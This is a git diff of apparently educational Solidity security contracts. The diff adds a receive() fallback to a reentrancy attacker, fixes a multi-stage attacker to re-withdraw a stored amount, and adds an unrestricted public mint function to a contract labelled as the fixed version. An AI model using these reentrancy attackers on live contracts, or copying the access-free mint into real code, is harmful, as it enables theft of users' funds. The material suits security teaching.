@@ -93,14 +93,25 @@ contract ReentrancyAttacker {
      */
     fallback() external payable {
         attackCount++;
-        
+
         if (attackCount <= 3) {  // 限制重入次数防止 Gas 耗尽
             emit ReentrancySuccess(msg.value);
-            
+
             // 再次调用取款 - 此时余额尚未扣除
             target.withdraw(msg.value);
         }
-        
+
+        stolenAmount += msg.value;
+    }
+
+    receive() external payable {
+        // 同样的逻辑用于接收 ETH
+        attackCount++;
+
+        if (attackCount <= 3) {
+            target.withdraw(msg.value);
+        }
+
         stolenAmount += msg.value;
     }
 
@@ -206,8 +217,17 @@ contract IntegerOverflowVulnerable {
  */
 contract IntegerOverflowFixed {
     mapping(address => uint256) public balances;
-    
+
     event Transfer(address indexed from, address indexed to, uint256 value);
+    event Mint(address indexed to, uint256 amount);
+
+    /**
+     * @dev 铸造代币 - 仅用于测试
+     */
+    function mint(address _to, uint256 _amount) public {
+        balances[_to] += _amount;
+        emit Mint(_to, _amount);
+    }
 
     /**
      * @dev ✅ 安全的转账函数
@@ -216,10 +236,10 @@ contract IntegerOverflowFixed {
     function safeTransfer(address _to, uint256 _amount) public {
         require(balances[msg.sender] >= _amount, "Insufficient balance");
         require(_to != address(0), "Invalid recipient");
-        
+
         balances[msg.sender] -= _amount;
         balances[_to] += _amount;
-        
+
         emit Transfer(msg.sender, _to, _amount);
     }
 
@@ -793,6 +813,7 @@ contract VulnerableVault {
 contract ComprehensiveAttacker {
     VulnerableVault public target;
     uint256 public attackSuccessCount;
+    uint256 public attackAmount;
 
     event AttackSuccess(string attackType, uint256 amount);
     event AttackFailed(string attackType, string reason);
@@ -806,16 +827,17 @@ contract ComprehensiveAttacker {
      */
     function reentrancyAttack() public payable {
         require(msg.value > 0, "Need ETH to attack");
-        
+        attackAmount = msg.value;
+
         target.deposit{value: msg.value}();
         target.withdraw(msg.value);
     }
 
     fallback() external payable {
         attackSuccessCount++;
-        
+
         if (attackSuccessCount <= 3) {
-            target.withdraw(msg.value);
+            target.withdraw(attackAmount);
         }
     }
 
